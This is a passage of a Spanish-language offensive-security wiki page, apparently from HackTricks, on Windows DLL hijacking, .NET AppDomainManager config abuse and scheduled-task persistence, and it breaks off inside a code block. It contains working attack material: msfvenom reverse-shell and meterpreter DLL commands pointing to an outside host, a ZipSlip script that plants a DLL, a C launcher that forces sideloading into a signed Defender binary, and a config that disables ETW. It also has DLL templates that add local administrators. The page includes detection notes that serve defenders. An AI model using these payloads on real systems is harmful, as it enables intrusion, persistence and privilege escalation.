# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Información básica

DLL Hijacking consiste en manipular una aplicación de confianza para que cargue una DLL maliciosa. Este término abarca varias tácticas, como **DLL Spoofing, Injection y Side-Loading**. Se utiliza principalmente para ejecutar código y lograr persistencia y, con menos frecuencia, para escalar privilegios. Aunque aquí nos centramos en la escalada, el método de hijacking es el mismo independientemente del objetivo.

### Técnicas comunes

Se emplean varios métodos para DLL hijacking; su eficacia depende de la estrategia de carga de DLL de la aplicación:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Sustituir una DLL legítima por una maliciosa, opcionalmente usando DLL Proxying para conservar la funcionalidad de la DLL original.
2. **DLL Search Order Hijacking**: Colocar la DLL maliciosa en una ruta de búsqueda anterior a la legítima y aprovechar el patrón de búsqueda de la aplicación.
3. **Phantom DLL Hijacking**: Crear una DLL maliciosa para que una aplicación la cargue al creer que es una DLL requerida que no existe.
4. **DLL Redirection**: Modificar parámetros de búsqueda como `%PATH%` o archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación a la DLL maliciosa.
5. **WinSxS DLL Replacement**: Sustituir la DLL legítima por una contraparte maliciosa en el directorio WinSxS; este método suele asociarse con DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar la DLL maliciosa en un directorio controlado por el usuario junto a la aplicación copiada, de forma similar a las técnicas de Binary Proxy Execution.

Una aplicación también puede implementar su **propio cargador de DLL**. Un proceso con privilegios puede enumerar un directorio secundario, como `Libraries` o `Plugins`, y pasar una DLL seleccionada a un proceso auxiliar, sin depender del orden de búsqueda normal de DLL de Windows. Si otra cuenta puede crear archivos en ese directorio exacto, considéralo una pista para investigar: confirma la identidad del proceso, la ACL efectiva del directorio, la regla de selección de archivos y si se puede alcanzar la operación de carga. Que se pueda escribir en un directorio junto a un ejecutable no demuestra que el proceso cargue DLL desde allí.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

El side-loading clásico deja intacto el PE de confianza y aprovecha la resolución de nombres de DLL. **Import grafting**, en cambio, modifica un PE que ya carga el programa de confianza. El atacante añade un descriptor de importación y las entradas asociadas de búsqueda/IAT para una DLL bajo su control. Cuando Windows resuelve recursivamente esa dependencia, asigna la DLL añadida y ejecuta su código de inicialización dentro del proceso, que por lo demás es legítimo. Se trata de una modificación de un PE en disco, no de la misma operación que reemplazar en tiempo de ejecución un puntero a una función de la IAT por un hook.<sup>[[26]](#references)[[27]](#references)</sup>

El PE modificado puede ser una DLL intermedia del proveedor, en lugar del ejecutable que inicia el usuario o el Programador de tareas. Una cadena reutilizable es:<sup>[[27]](#references)</sup>

1. Copiar el ejecutable legítimo y sus dependencias a un directorio controlado por el atacante.
2. Modificar las estructuras de importación de una dependencia para que hagan referencia a la DLL maliciosa, conservando las exportaciones esperadas y el comportamiento normal de la dependencia.
3. Configurar una ejecución automática o una tarea programada para iniciar el ejecutable legítimo. El cargador asigna la dependencia modificada y, después, la DLL recién importada. Consulta [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) para enumerar tareas.
4. Evitar realizar tareas costosas en `DllMain`; el cargador observado creó un hilo de trabajo y continuó allí el descifrado por etapas.

Esto difiere de una vulneración de la cadena de suministro del proveedor porque el paquete del proveedor está limpio y la modificación de importación se realiza después de la instalación. Clasifica cada módulo del directorio preparado, no solo el EXE anfitrión: compara las listas de importación y los hashes de las dependencias con una instalación conocida como legítima, verifica las firmas e investiga los binarios del proveedor iniciados desde ubicaciones inesperadas en las que se pueda escribir, como `C:\ProgramData`. Una tarea programada que apunte a una copia de un informe de fallos o actualizador en un directorio de este tipo es un pivote especialmente útil.<sup>[[27]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

El DLL sideloading clásico no es la única forma de hacer que un proceso de **.NET Framework** de confianza cargue código del atacante. Si el ejecutable objetivo es una aplicación **managed**, el CLR también consulta un **archivo de configuración de la aplicación** cuyo nombre se basa en el ejecutable (por ejemplo, `Setup.exe.config`). Ese archivo puede definir un **AppDomainManager** personalizado. Si la configuración apunta a un assembly controlado por el atacante y situado junto al EXE, el CLR lo carga **antes de que se ejecute el flujo normal de la aplicación** y este se ejecuta dentro del proceso de confianza.<sup>[[24]](#references)</sup>

Según el esquema de configuración de .NET Framework de Microsoft, deben estar presentes tanto `<appDomainManagerAssembly>` como `<appDomainManagerType>` para que se use el administrador personalizado.<sup>[[16]](#references)[[17]](#references)</sup>

Configuración mínima:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Gestor mínimo:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Notas prácticas:
- Esta técnica es **específica de .NET Framework**. Depende del análisis de configuración del CLR, no del orden de búsqueda de DLL de Win32.
- El host debe ser realmente un **EXE administrado**. Triage rápido: `sigcheck -m target.exe`, `corflags target.exe` o comprobar si hay un **CLR Runtime Header** en los metadatos PE.
- El nombre del archivo de configuración debe coincidir exactamente con el nombre del ejecutable (`<binary>.config`) y normalmente se encuentra **junto al EXE**.
- Esto resulta útil con **binarios firmados de Microsoft o de proveedores** porque el EXE de confianza permanece intacto mientras el ensamblado administrado malicioso se ejecuta en el mismo proceso.
- Si ya tienes un directorio de instalación/actualización con permisos de escritura, AppDomainManager hijacking puede usarse como **primera etapa**, seguida de DLL sideloading clásico o carga reflectiva para las etapas posteriores.

### AppDomainManager como downloader + bootstrap de tarea programada

Un patrón práctico de intrusión consiste en emparejar el EXE administrado de confianza con un `*.config` malicioso y una DLL AppDomainManager maliciosa que actúa únicamente como un **pequeño bootstrapper**:<sup>[[25]](#references)</sup>

1. El usuario inicia un instalador o actualizador .NET firmado desde una ubicación creíble, como `%USERPROFILE%\Downloads`.
2. La configuración adyacente hace que el CLR cargue el ensamblado del atacante **antes de que comience la lógica de la aplicación legítima**.
3. El manager malicioso realiza un **path gate** (por ejemplo, continuar solo si el EXE host se ejecuta desde `Downloads` y permitir que la segunda etapa se ejecute únicamente desde `%LOCALAPPDATA%`).
4. Si la comprobación se supera, descarga la carga útil real en una ruta con permisos de escritura para el usuario, como `%LOCALAPPDATA%\PerfWatson2.exe`, e instala persistencia mediante una tarea programada.

Por qué importa esta variante:
- El EXE host firmado permanece sin cambios, por lo que el triage que solo calcula el hash del binario principal podría no detectar el compromiso.
- Es común usar **anti-análisis basado en rutas**: mover el trío ZIP/EXE/DLL a Desktop, Temp o una ruta de sandbox puede interrumpir la cadena deliberadamente.
- La DLL AppDomainManager de primera etapa puede ser pequeña y generar poco ruido, mientras que el implante real se descarga más adelante.

Ejemplo mínimo de persistencia que se observa a menudo con este patrón:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notas:
- `/rl highest` significa **el nivel más alto disponible** para ese usuario o sesión; por sí solo, no garantiza una escalada a SYSTEM.
- Esta técnica suele clasificarse mejor como **ejecución/persistencia mediante abuso de la configuración de .NET** que como un secuestro clásico del orden de búsqueda por DLL faltante, aunque los operadores suelen encadenar ambas técnicas.

Puntos de detección:
- Ejecutables .NET firmados que se inician desde **rutas de extracción ZIP**, `Downloads`, `%TEMP%` u otras carpetas en las que el usuario puede escribir, junto con un archivo `<exe>.config` **en la misma ubicación**.
- Nuevas tareas programadas cuya acción apunta a `%LOCALAPPDATA%`, `%APPDATA%` o `Downloads` y cuyos nombres imitan los de actualizadores de navegadores o proveedores.
- Procesos de arranque administrados de corta duración que descargan inmediatamente otro EXE y luego inician `schtasks.exe`.
- Muestras que se cierran de forma anticipada a menos que la ruta del ejecutable coincida con una ubicación prevista dentro del perfil de usuario.

### Secuestrar una tarea programada existente para volver a ejecutar la cadena de sideload

Para lograr persistencia, no busques únicamente **la creación de una tarea nueva**. Algunos grupos de intrusión esperan a que un instalador legítimo cree una **tarea de actualización normal** y luego **reescriben la acción de la tarea** para que el nombre, el autor y el desencadenador existentes sigan resultando familiares para los defensores.

Flujo de trabajo reutilizable:
1. Instala o ejecuta el software legítimo e identifica la tarea que normalmente crea.
2. Exporta el XML de la tarea y anota los valores actuales de `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Reemplaza solo la acción para que la tarea inicie tu **EXE anfitrión de confianza** desde un directorio de preparación en el que el usuario pueda escribir; este ejecutable luego carga lateralmente el payload real o lo carga mediante AppDomain.
4. Vuelve a registrar el mismo nombre de tarea en lugar de crear un artefacto de persistencia nuevo y obvio.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Por qué es más sigiloso:
- El nombre de la tarea puede seguir pareciendo legítimo (por ejemplo, el de un actualizador de un proveedor).
- Lo inicia el **servicio Task Scheduler**, por lo que la validación del proceso padre o de los ancestros suele detectar la cadena de programación esperada en lugar de `explorer.exe`.
- Los equipos DFIR que solo buscan **nombres de tareas nuevos** pueden pasar por alto una tarea cuyo registro ya existía, pero cuya acción ahora apunta a `%LOCALAPPDATA%`, `%APPDATA%` u otra ruta controlada por el atacante.

Puntos de búsqueda rápidos:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compara el XML de `C:\Windows\System32\Tasks\*` y los metadatos de `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` con una línea base.
- Genera una alerta cuando una **tarea de actualización que parece ser de un proveedor** se ejecuta desde **directorios en los que los usuarios pueden escribir** o inicia un EXE de .NET con un archivo `*.config` en el mismo directorio.

> [!TIP]
> Para ver una cadena paso a paso que combina el staging con HTML, configuraciones AES-CTR e implants de .NET sobre DLL sideloading, revisa el siguiente flujo de trabajo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Encontrar DLL faltantes

La forma más común de encontrar DLL faltantes en un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de Sysinternals y **configurar los siguientes 2 filtros**:

![Técnicas comunes - Encontrar DLL faltantes: La forma más común de encontrar DLL faltantes en un sistema es ejecutar procmon de Sysinternals y configurar los siguientes 2 filtros](<../../../images/image (961).png>)

![Técnicas comunes - Encontrar DLL faltantes: La forma más común de encontrar DLL faltantes en un sistema es ejecutar procmon de Sysinternals y configurar los siguientes 2 filtros](<../../../images/image (230).png>)

y mostrar solo la **actividad del sistema de archivos**:

![Técnicas comunes - Encontrar DLL faltantes: y mostrar solo la actividad del sistema de archivos](<../../../images/image (153).png>)

Si buscas **DLL faltantes en general**, déjalo ejecutándose durante algunos **segundos**.\
Si buscas una **DLL faltante dentro de un ejecutable específico**, añade otro filtro, como **"Process Name" "contains" `<exec name>`**, ejecútalo y detén la captura de eventos.<sup>[[9]](#references)</sup>

## Explotar DLL faltantes

Para escalar privilegios, busca una **DLL que un proceso privilegiado intente cargar** desde una ubicación en la que puedas escribir. Esto puede ocurrir cuando controlas un directorio que se busca antes que el directorio que contiene la DLL legítima, o cuando la DLL solicitada no existe y puedes escribir en uno de los directorios de búsqueda.

### Orden de búsqueda de DLL

**En la** [**documentación de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes encontrar cómo se cargan específicamente las DLL.**

Las **aplicaciones de Windows** buscan DLL siguiendo un conjunto de **rutas de búsqueda predefinidas** y un orden determinado. El problema de DLL hijacking surge cuando se coloca estratégicamente una DLL maliciosa en uno de esos directorios para que se cargue antes que la DLL auténtica. Una solución para evitarlo es asegurarse de que la aplicación use rutas absolutas al hacer referencia a las DLL que necesita.

A continuación puedes ver el **orden de búsqueda de DLL en sistemas de 32 bits**:

1. El directorio desde el que se cargó la aplicación.
2. El directorio del sistema. Usa la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio.(_C:\Windows\System32_)
3. El directorio del sistema de 16 bits. No hay ninguna función que obtenga la ruta de este directorio, pero se busca en él. (_C:\Windows\System_)
4. El directorio de Windows. Usa la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
   1. (_C:\Windows_)
5. El directorio actual.
6. Los directorios indicados en la variable de entorno PATH. Ten en cuenta que esto no incluye la ruta específica de la aplicación definida por la clave de registro **App Paths**. La clave **App Paths** no se usa al calcular la ruta de búsqueda de DLL.

Este es el orden de búsqueda **predeterminado** con **SafeDllSearchMode** habilitado. Si está deshabilitado, el directorio actual sube al segundo lugar. Para deshabilitar esta función, crea el valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y establécelo en 0 (está habilitado de forma predeterminada).

Si se llama a la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) con **LOAD_WITH_ALTERED_SEARCH_PATH**, la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Por último, una DLL puede cargarse mediante una ruta absoluta en lugar de por nombre. En ese caso, Windows busca la DLL solo en esa ruta; las dependencias solicitadas por nombre siguen el orden de búsqueda correspondiente.

Hay otras formas de modificar el orden de búsqueda, pero no las explicaré aquí.

### Encadenar una escritura arbitraria de archivos con un hijack de una DLL faltante

**Técnica relacionada:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Usa filtros de **ProcMon** (`Process Name` = EXE objetivo, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) para recopilar los nombres de DLL que el proceso busca, pero no encuentra.<sup>[[14]](#references)</sup>
2. Si el binario se ejecuta mediante una **tarea programada o un servicio**, al colocar una DLL con uno de esos nombres en el **directorio de la aplicación** (entrada n.º 1 del orden de búsqueda), se cargará en la siguiente ejecución. En un caso con un scanner de .NET, el proceso buscaba `hostfxr.dll` en `C:\samples\app\` antes de cargar la copia real desde `C:\Program Files\dotnet\fxr\...`.
3. Crea una DLL de payload (por ejemplo, una reverse shell) con cualquier exportación: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Si tu primitiva es una **escritura arbitraria de estilo ZipSlip**, crea un ZIP cuya entrada salga del directorio de extracción para que la DLL acabe en la carpeta de la aplicación:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Entrega el archivo comprimido en la bandeja de entrada/compartición supervisada; cuando la tarea programada vuelva a iniciar el proceso, este carga la DLL maliciosa y ejecuta tu código como la cuenta de servicio.

### Forzar el sideloading mediante RTL_USER_PROCESS_PARAMETERS.DllPath

Una forma avanzada de influir de manera determinista en la ruta de búsqueda de DLL de un proceso recién creado consiste en establecer el campo DllPath de RTL_USER_PROCESS_PARAMETERS al crear el proceso con las API nativas de ntdll. Al proporcionar aquí un directorio controlado por el atacante, se puede forzar a un proceso objetivo que resuelva una DLL importada por nombre (sin ruta absoluta y sin usar los flags de carga segura) a cargar una DLL maliciosa desde ese directorio.

Idea clave
- Crea los parámetros del proceso con RtlCreateProcessParametersEx y proporciona un DllPath personalizado que apunte a tu carpeta controlada (por ejemplo, el directorio donde se encuentra tu dropper/unpacker).
- Crea el proceso con RtlCreateUserProcess. Cuando el binario objetivo resuelva una DLL por nombre, el loader consultará el DllPath proporcionado durante la resolución, lo que permite un sideloading fiable incluso cuando la DLL maliciosa no está en el mismo directorio que el EXE objetivo.

Notas/limitaciones
- Esto afecta al proceso hijo que se está creando; es distinto de SetDllDirectory, que solo afecta al proceso actual.
- El objetivo debe importar una DLL por nombre o cargarla mediante LoadLibrary (sin ruta absoluta y sin usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs y las rutas absolutas codificadas no se pueden secuestrar. Las exportaciones reenviadas y SxS pueden cambiar el orden de precedencia.

Ejemplo mínimo en C (ntdll, cadenas wide, manejo de errores simplificado):

<details>
<summary>Ejemplo completo en C: forzar el sideloading de DLL mediante RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Ejemplo de uso operativo
- Coloca un xmllite.dll malicioso (que exporte las funciones requeridas o actúe como proxy del real) en tu directorio DllPath.
- Inicia un binario firmado que, según se sabe, busca xmllite.dll por nombre mediante la técnica anterior. El loader resuelve la importación mediante el DllPath proporcionado y carga lateralmente tu DLL.

Se ha observado esta técnica en entornos reales para ejecutar cadenas de sideloading de varias etapas: un launcher inicial deja una DLL auxiliar, que luego inicia un binario vulnerable a hijacking y firmado por Microsoft, con un DllPath personalizado para forzar la carga de la DLL del atacante desde un directorio de staging.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking de .NET mediante `.exe.config`

Para objetivos de **.NET Framework**, se puede realizar sideloading **antes de `Main()`** sin parchear memoria, abusando del archivo **`.exe.config`** adyacente a la aplicación. En lugar de depender únicamente del orden de búsqueda de DLL de Win32, el atacante coloca un EXE legítimo de .NET junto a un archivo de configuración malicioso y uno o más ensamblados controlados por el atacante.

Así funciona la cadena:<sup>[[15]](#references)[[22]](#references)</sup>
1. Se inicia el EXE anfitrión y el **CLR lee `<exe>.config`**.
2. La configuración establece **`<appDomainManagerAssembly>`** y **`<appDomainManagerType>`** para que el runtime cree un `AppDomainManager` controlado por el atacante.
3. El manager malicioso obtiene **ejecución antes de `Main()`** dentro del proceso anfitrión de confianza.
4. La misma configuración puede forzar al CLR a resolver primero los ensamblados locales (por ejemplo, `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) y puede debilitar la validación/telemetría del runtime sin parcheo inline.

Patrón de estilo campaña (el anidamiento exacto puede variar según la directiva o la versión del CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Por qué es útil:
- **`<probing privatePath="."/>`** mantiene la resolución de ensamblados en el directorio de la aplicación y convierte la carpeta en una superficie predecible para sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** trasladan la ejecución a código del atacante durante la inicialización de CLR, antes de que se ejecute la lógica legítima de la aplicación.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** puede permitir que una aplicación de full-trust cargue ensamblados sin firmar o manipulados sin que falle la validación de strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** evita redirecciones de publisher-policy a ensamblados más recientes.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** hace más determinista la selección del runtime.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** es especialmente interesante porque **CLR desactiva su propia visibilidad de ETW** desde la configuración, en lugar de que el implant parchee `EtwEventWrite` en memoria.

Patrón operativo observado en campañas recientes:
- Etapa 1: deja `setup.exe`, `setup.exe.config` y ensamblados locales.
- Etapa 2: los copia en una carpeta de **actualización de AppData** que parezca legítima, cambia el nombre del host a algo como `update.exe` y lo vuelve a iniciar mediante una **tarea programada**.
- Etapa 3: verifica el contexto de ejecución (por ejemplo, que el proceso padre esperado sea `svchost.exe`, iniciado por Task Scheduler) antes de cargar el DLL/export final del RAT.

Ideas para hunting:
- **Ejecutables .NET** firmados o legítimos que se ejecutan junto a archivos **`.config`** sospechosos en ubicaciones donde los usuarios pueden escribir.
- Archivos `.config` que contienen **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** o **`etwEnable enabled="false"`**.
- Tareas programadas que vuelven a iniciar binarios de actualización con nombres cambiados desde **`%LOCALAPPDATA%`** o directorios específicos de la aplicación como `\bin\update\`.
- Cadenas de procesos padre/hijo en las que una tarea programada inicia un host .NET confiable que carga inmediatamente ensamblados que no pertenecen al proveedor desde su propio directorio.

#### Excepciones al orden de búsqueda de DLL según la documentación de Windows

La documentación de Windows señala ciertas excepciones al orden de búsqueda estándar de DLL:

- Cuando se encuentra una **DLL que comparte su nombre con una ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, comprueba si hay una redirección y un manifiesto antes de recurrir a la DLL que ya está en memoria. **En este caso, el sistema no busca la DLL**.
- Si la DLL se reconoce como una **DLL conocida** para la versión actual de Windows, el sistema utilizará su versión de esa DLL conocida, junto con cualquiera de sus DLL dependientes, **sin realizar la búsqueda**. La clave del Registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estas DLL conocidas.
- Si una **DLL tiene dependencias**, la búsqueda de estas DLL dependientes se realiza como si solo se hubieran indicado sus **nombres de módulo**, independientemente de que la DLL inicial se haya identificado mediante una ruta completa.

### Escalada de privilegios

**Requisitos**:

- Identificar un proceso que se ejecute o vaya a ejecutarse con **privilegios diferentes** (movimiento horizontal o lateral) y al que **le falte una DLL**.
- Asegurarse de tener **acceso de escritura** a cualquier **directorio** en el que se vaya a **buscar la DLL**. Puede ser el directorio del ejecutable o un directorio de la ruta del sistema.

Estos requisitos no suelen darse por defecto: los ejecutables con privilegios elevados normalmente no carecen de dependencias DLL, y los usuarios estándar normalmente no pueden escribir en los directorios de búsqueda del sistema. Aun así, los entornos mal configurados pueden presentar ambas condiciones.\
Si se cumplen los requisitos, consulta el proyecto [UACME](https://github.com/hfiref0x/UACME). Aunque su objetivo principal es eludir UAC, contiene PoC de DLL hijacking para versiones específicas de Windows que a menudo se pueden adaptar al directorio escribible que hayas encontrado.

Ten en cuenta que puedes **comprobar tus permisos en una carpeta** con:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Y **comprueba los permisos de todas las carpetas dentro de PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

También puedes comprobar las importaciones de un ejecutable y las exportaciones de una DLL con:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Para obtener una guía completa sobre cómo **abusar de DLL Hijacking para escalar privilegios** con permisos de escritura en una **carpeta de System Path**, consulta:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Herramientas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) comprobará si tienes permisos de escritura en alguna carpeta dentro de system PATH.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las funciones de **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll._

### Ejemplo

Si encuentras un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará de ella**. De todos modos, ten en cuenta que DLL Hijacking resulta útil para [**escalar del nivel Medium Integrity a High (eludiendo UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o de[ **High Integrity a SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear una dll válida** en este estudio sobre DLL hijacking centrado en la ejecución de DLL: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **siguiente sección** encontrarás algunos **códigos básicos de dll** que pueden resultar útiles como **plantillas** o para crear una **dll con funciones exportadas que no son necesarias**.

## **Crear y compilar DLLs**

### **DLL Proxifying**

Básicamente, un **proxy de DLL** es una DLL capaz de **ejecutar tu código malicioso al cargarse**, pero también de **exponer** y **funcionar** como **se espera**, **reenviando todas las llamadas a la biblioteca real**.

Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus), puedes **indicar un ejecutable y seleccionar la biblioteca** que quieres convertir en proxy para **generar una dll proxificada**, o **indicar la DLL** y **generar una dll proxificada**.

### **Meterpreter**

**Obtener rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Obtener un meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Crear un usuario (x86, no vi una versión x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Propio

En muchos casos, la DLL que compiles debe **exportar todas las funciones que importa el proceso víctima**. Si falta una exportación necesaria, el binario no puede resolverla y el exploit falla.

<details>
<summary>Plantilla de DLL en C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Ejemplo de DLL de C++ con creación de usuario</summary>

```c
